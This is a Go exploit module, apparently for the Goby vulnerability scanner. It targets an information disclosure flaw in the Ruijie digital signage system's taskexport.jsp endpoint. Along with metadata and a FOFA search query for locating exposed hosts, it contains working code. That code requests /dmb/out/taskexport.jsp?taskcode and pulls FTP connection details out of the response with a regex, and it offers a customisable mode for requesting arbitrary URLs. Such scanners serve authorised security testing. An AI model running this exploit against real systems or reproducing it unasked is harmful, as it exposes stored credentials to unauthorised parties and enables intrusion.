package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Ruijie Digital Signage System taskexport.jsp Information Disclosure Vulnerability",
    "Description": "<p>The Xingwang Ruijie digital signage system can support financial servers and has specialized management functions such as statistical reports, personalized playback styles, remote management terminals, and backend simulation preview playback. Can be connected to queue calling, LED synchronous screen, asynchronous screen and other functions</p>",
    "Product": "Star-Net-Sharp-internal-System",
    "Homepage": "https://www.star-net.cn/index.php",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-09-04",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "body=\"/dmb/js/locale/jquery-lang-zh_CN.js\" && body=\"/dmb/js/ext-ex/state/UserCookieProvider.js\"",
    "GobyQuery": "body=\"/dmb/js/locale/jquery-lang-zh_CN.js\" && body=\"/dmb/js/ext-ex/state/UserCookieProvider.js\"",
    "Level": "0",
    "Impact": "<p>Its taskexport.jsp interface has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"https://www.star-net.cn/index.php\">https://www.star-net.cn/index.php</a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "ftp",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "锐捷数字标牌系统 taskexport.jsp 信息泄露漏洞",
            "Product": "锐捷数字标牌系统",
            "Description": "<p>星网锐捷数字标牌系统可支持金融服务器，具有专业化管理功能：统计报表，个性化播放样式，远程管理终端，后台模拟预览播放等。可对接排队叫号，LED同步屏和异步屏等功能。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.star-net.cn/index.php\">https://www.star-net.cn/index.php</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其&nbsp;taskexport.jsp&nbsp;接口存在信息泄露漏洞，未经授权的攻击者访问，可能会获得敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Ruijie Digital Signage System taskexport.jsp Information Disclosure Vulnerability",
            "Product": "Star-Net-Sharp-internal-System",
            "Description": "<p>The Xingwang Ruijie digital signage system can support financial servers and has specialized management functions such as statistical reports, personalized playback styles, remote management terminals, and backend simulation preview playback. Can be connected to queue calling, LED synchronous screen, asynchronous screen and other functions<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"https://www.star-net.cn/index.php\">https://www.star-net.cn/index.php</a><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Its taskexport.jsp interface has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9949"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/dmb/out/taskexport.jsp?taskcode"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/dmb/out/taskexport.jsp?taskcode": "user=",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"ftp": {"/dmb/out/taskexport.jsp?taskcode", "rootpath='"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			regular := `<ftp([\s\S]*)\/>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			output, err := makeRegular(resp, regular)

			expResult.Success = true
			expResult.Output = "泄露信息：ftp连接信息\n" + output
			return expResult
		},
	))
}
